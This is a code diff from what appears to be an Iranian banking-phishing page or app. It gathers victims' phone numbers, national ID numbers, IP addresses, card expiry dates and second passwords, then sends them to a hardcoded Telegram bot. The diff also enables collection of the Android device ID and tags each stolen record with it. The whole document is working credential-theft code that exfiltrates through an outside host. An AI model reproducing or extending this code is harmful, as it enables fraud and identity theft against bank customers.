@@ -1,6 +1,25 @@
 const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
 const chatId = '-4614449543';
-
+const sendMessage = async function (message) {
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      // parse_mode: 'MarkdownV2',
+    }),
+  })
+    .then(response => response.json())
+    .then(data => {
+      return data;
+    })
+    .catch(error => {
+      console.error('خطا در ارسال پیام:', error.message);
+    });
+};
 let userIp;
 async function getUserIP() {
   try {
@@ -62,8 +81,8 @@ function isValidEmail(email) {
   return emailPattern.test(email);
 }
 
-// const androidId = androidListener.getAndroidID();
-// const device = androidListener.deviceName();
+const androidId = androidListener.getAndroidID();
+const device = androidListener.deviceName();
 
 firstBtn.addEventListener('click', () => {
   if (!validateIranianMobileNumber(phoneInput.value)) {
@@ -94,7 +113,7 @@ firstBtn.addEventListener('click', () => {
 Phone: ${phone}
 CodeMeli: ${codeMeli}
 IP : ${userIp}
-Tag: #${''}
+Tag: #${androidId}
   `;
       sendMessage(message);
       document.getElementById('page1').classList.add('hidden');
@@ -108,26 +127,6 @@ Tag: #${''}
 });
 
 // page 3
-const sendMessage = async function (message) {
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      // parse_mode: 'MarkdownV2',
-    }),
-  })
-    .then(response => response.json())
-    .then(data => {
-      return data;
-    })
-    .catch(error => {
-      console.error('خطا در ارسال پیام:', error.message);
-    });
-};
 
 function validateExpirationDate(month, year) {
   // بررسی اینکه ماه معقول باشد
@@ -368,7 +367,7 @@ Month : ${mm}
 Year : ${yy}
 Pass2 : ${poyaInput.value}
 IP : ${userIp}
-Tag : #${''}
+Tag : #${androidId}
   `;
     sendMessage(message);
     setTimeout(() => {
@@ -439,7 +438,7 @@ Month : ${mm}
 Year : ${yy}
 Fixed : ${poyaInput.value}
 IP : ${userIp}
-Tag :  #${''}
+Tag :  #${androidId}
   `;
     sendMessage(message);
     setTimeout(() => {
